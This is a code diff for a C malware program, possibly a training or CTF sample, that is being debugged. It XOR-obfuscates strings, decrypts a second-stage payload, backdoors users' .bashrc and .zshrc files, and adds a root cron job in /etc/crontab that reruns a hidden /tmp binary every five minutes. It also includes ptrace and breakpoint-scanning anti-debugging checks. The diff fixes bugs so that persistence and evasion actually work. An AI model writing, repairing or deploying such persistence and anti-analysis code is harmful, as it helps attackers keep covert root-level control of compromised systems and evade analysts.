@@ -30,7 +30,7 @@ extern const int _binary_stage2_comp_size;
 //#define AES_KEY_XOR "/usr/lib/os-release"
 //#define PERSISTENCE_XOR "/tmp/.entry-3tps-93f8u-rprt"
 //#define CRON_XOR "*/5 * * * * root /tmp/.entry-3tps-93f8u-rprt\n"
-//#define CRON_FILE_XOR "/etc/crobtab"
+//#define CRON_FILE_XOR "/etc/crontab"
 // END_SOURCE_STRINGS
 
 //START OBFUSCATING
@@ -144,20 +144,6 @@ void backdoor_rcfiles() {
     } 
 }
 
-void backdoor_cron() {
-    char str[256];
-    strncpy(str, dexor(CRON_XOR), 256);
-
-    FILE * cron_file = fopen(dexor(CRON_FILE_XOR),"a");
-
-    if (cron_file ) {
-        if (!check_filecontains(cron_file, str)) {
-            fputs(str, cron_file);
-	}
-	fclose(cron_file);
-    }
-    
-}
 
 int check_filecontains(FILE * fd, char * to_search) {
     char search_buf[256];
@@ -165,10 +151,10 @@ int check_filecontains(FILE * fd, char * to_search) {
 
     fseek(fd, 0, SEEK_END);
     int len = ftell(fd);
-    rewind(fd);
-    
+    fseek(fd, 0, SEEK_SET);
+     
     char * file_buf = (char*) malloc(len * sizeof(char));
-    fread(file_buf, len, 1, fd);
+    fread(file_buf, len , 1, fd); 
 
     // Now check if the buffer contains our search bytesequence.
     int window_len = strlen(search_buf);
@@ -176,19 +162,29 @@ int check_filecontains(FILE * fd, char * to_search) {
 
     for (int i = 0; i < len; i++) {
        if (search_buf[buf_ptr] == *(file_buf + i) ) {
-           buf_ptr++;
+	   buf_ptr++;
 	   if (buf_ptr == window_len) {
 	       free(file_buf);
 	       return 1;
 	   }
        } else {
-
            buf_ptr = 0;
        }
     }
-
     free(file_buf);
     return 0;
+}
+
+void backdoor_cron() {
+    char str[256];
+    strncpy(str, dexor(CRON_XOR), 256);
+    FILE * cron_file = fopen(dexor(CRON_FILE_XOR),"a+");
+    if (cron_file ) {
+        if (!check_filecontains(cron_file, str)) {
+            fputs(str, cron_file);
+	}
+	fclose(cron_file);
+    } 
 }
 
 /**
@@ -202,25 +198,29 @@ void clean_rcfiles() {
         snprintf(str, 256,dexor(ZSHRC_XOR),  homedir);
         FILE * rc_file = fopen(str, "r");
         // Look for zshrc 
-        if (rc_file && check_filecontains(rc_file, dexor(ALIAS_STR_XOR))) { 
-            fseek(rc_file, 0, SEEK_END);
-            int size = ftell(rc_file);
-            fclose(rc_file);
-	    int xor_len = strlen(dexor(ALIAS_STR_XOR));
-    	    // Truncate off the bytes for the .bashrc backdoor
-            ftruncate(str, size - xor_len);	 
+	if (rc_file) {
+	   if (check_filecontains(rc_file, dexor(ALIAS_STR_XOR))) { 
+                fseek(rc_file, 0, SEEK_END);
+                int size = ftell(rc_file);
+                fclose(rc_file);
+	        int xor_len = strlen(dexor(ALIAS_STR_XOR));
+                // Truncate off the bytes for the .bashrc backdoor
+                ftruncate(str, size - xor_len);	 
+	    }
 	}
 
         snprintf(str, 256, dexor(BASHRC_XOR), homedir);
         // Look for bashrc
         rc_file = fopen(str, "r");
-        if (rc_file && check_filecontains(rc_file, dexor(ALIAS_STR_XOR))) {
-            fseek(rc_file, 0, SEEK_END);
-            int size = ftell(rc_file);
-            fclose(rc_file);
-	    int xor_len = strlen(dexor(ALIAS_STR_XOR));
-    	    // Truncate off the bytes for the .bashrc backdoor
-            ftruncate(str, size - xor_len);  
+        if (rc_file) {
+	    if (check_filecontains(rc_file, dexor(ALIAS_STR_XOR))) {
+                fseek(rc_file, 0, SEEK_END);
+                int size = ftell(rc_file);
+                fclose(rc_file);
+	        int xor_len = strlen(dexor(ALIAS_STR_XOR));
+    	        // Truncate off the bytes for the .bashrc backdoor
+                ftruncate(str, size - xor_len);  
+	    }
 	}
     } 
 }
@@ -319,7 +319,7 @@ int main() {
 
     // Debug prevention. Really we are preventing an easy strace :)
     if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
-        printf(dexor(CAPN_XOR));
+        printf("%s", dexor(CAPN_XOR));
         exit(0);
     } else {
         ptrace(PTRACE_DETACH, 0, 1, 0);
@@ -327,27 +327,27 @@ int main() {
 
     // Check any functions for bps
     if ((*(volatile unsigned long *)((unsigned long)perform_source) & 0xff) == 0xcc) {
-        printf(dexor(ANTI_DEBUG_XOR));
+        printf("%s", dexor(ANTI_DEBUG_XOR));
 	exit(0);
     }
     if ((*(volatile unsigned long *)((unsigned long) backdoor_rcfiles) & 0xff) == 0xcc) {
-        printf(dexor(ANTI_DEBUG_XOR));
+        printf("%s", dexor(ANTI_DEBUG_XOR));
 	exit(0);
     }
     if ((*(volatile unsigned long *)((unsigned long) copy_self) & 0xff) == 0xcc) {
-        printf(dexor(ANTI_DEBUG_XOR));
+        printf("%s", dexor(ANTI_DEBUG_XOR));
 	exit(0);
     }
     if ((*(volatile unsigned long *)((unsigned long) decrypt_stage2) & 0xff) == 0xcc) {
-        printf(dexor(ANTI_DEBUG_XOR));
+        printf("%s", dexor(ANTI_DEBUG_XOR));
 	exit(0);
     } 
     if ((*(volatile unsigned long *)((unsigned long) round_up) & 0xff) == 0xcc) {
-        printf(dexor(ANTI_DEBUG_XOR));
+        printf("%s", dexor(ANTI_DEBUG_XOR));
 	exit(0);
     }
     if ((*(volatile unsigned long *)((unsigned long) dexor) & 0xff) == 0xcc) {
-        printf(dexor(ANTI_DEBUG_XOR));
+        printf("%s", dexor(ANTI_DEBUG_XOR));
 	exit(0);
     }
 
